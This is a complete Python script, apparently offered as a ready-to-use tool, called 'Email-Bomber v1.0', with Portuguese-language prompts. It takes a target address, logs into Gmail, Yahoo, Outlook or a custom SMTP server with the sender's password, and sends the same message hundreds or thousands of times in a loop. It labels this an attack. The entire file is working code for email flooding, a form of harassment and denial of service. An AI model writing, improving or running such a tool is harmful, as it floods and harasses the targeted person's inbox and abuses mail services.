'''imports'''
import smtplib
import sys


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ feito com códigos ]+]+]+')
    print(bcolors.GREEN + '''
                     \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[ 
           |#############################|
           |#############################|              Autor: BlackTrace
           |#############################|
            |###########################|
             \#########################/
              `.#####################,' 
                `._###############_,'
                   `--..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomba)
                                                                    `--' ''')


try:
    class Email_Bomber:
        count = 0

        def __init__(self):
            try:
                print(bcolors.RED + '\n+[+[+[ Inicializando programa ]+]+]+')
                self.target = str(input(bcolors.GREEN + 'Digite o email alvo <: '))
                self.mode = int(input(bcolors.GREEN + 'Escolha o modo da BOMBA (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(personalizado) <: '))
                if int(self.mode) > int(4) or int(self.mode) < int(1):
                    print('ERRO: Opção inválida. Adeus.')
                    sys.exit(1)
            except Exception as e:
                print(f'ERRO: {e}')

        def bomb(self):
            try:
                print(bcolors.RED + '\n+[+[+[ Configurando bomba ]+]+]+')
                self.amount = None
                if self.mode == 1:
                    self.amount = 1000
                elif self.mode == 2:
                    self.amount = 500
                elif self.mode == 3:
                    self.amount = 250
                else:
                    self.amount = int(input(bcolors.GREEN + 'Escolha a quantidade PERSONALIZADA <: '))
                print(bcolors.RED + f'\n+[+[+[ Você selecionou o modo BOMBA: {self.mode} e {self.amount} emails ]+]+]+')
            except Exception as e:
                print(f'ERRO: {e}')

        def email(self):
            try:
                print(bcolors.RED + '\n+[+[+[ Configurando email ]+]+]+')
                self.server = str(input(bcolors.GREEN + 'Digite o servidor de email | ou escolha opções prontas - 1:Gmail 2:Yahoo 3:Outlook <: '))
                premade = ['1', '2', '3']
                default_port = True
                if self.server not in premade:
                    default_port = False
                    self.port = int(input(bcolors.GREEN + 'Digite o número da porta <: '))

                if default_port == True:
                    self.port = 587

                if self.server == '1':
                    self.server = 'smtp.gmail.com'
                elif self.server == '2':
                    self.server = 'smtp.mail.yahoo.com'
                elif self.server == '3':
                    self.server = 'smtp-mail.outlook.com'

                self.fromAddr = str(input(bcolors.GREEN + 'Digite o email de origem <: '))
                self.fromPwd = str(input(bcolors.GREEN + 'Digite a senha do email de origem <: '))
                self.subject = str(input(bcolors.GREEN + 'Digite o assunto <: '))
                self.message = str(input(bcolors.GREEN + 'Digite a mensagem <: '))

                self.msg = '''From: %s\nTo: %s\nSubject: %s\n%s\n
                ''' % (self.fromAddr, self.target, self.subject, self.message)

                self.s = smtplib.SMTP(self.server, self.port)
                self.s.ehlo()
                self.s.starttls()
                self.s.ehlo()
                self.s.login(self.fromAddr, self.fromPwd)
            except Exception as e:
                print(f'ERRO: {e}')

        def send(self):
            try:
                self.s.sendmail(self.fromAddr, self.target, self.msg)
                self.count += 1
                print(bcolors.YELLOW + f'BOMBA: {self.count}')
            except Exception as e:
                print(f'ERRO: {e}')

        def attack(self):
            print(bcolors.RED + '\n+[+[+[ Atacando... ]+]+]+')
            for email in range(self.amount + 1):
                self.send()
            self.s.close()
            print(bcolors.RED + '\n+[+[+[ Ataque finalizado ]+]+]+')
            sys.exit(0)


    if __name__ == '__main__':
        banner()
        bomb = Email_Bomber()
        bomb.bomb()
        bomb.email()
        bomb.attack()
except KeyboardInterrupt:
    print("\n[-] Pressione Enter para sair")
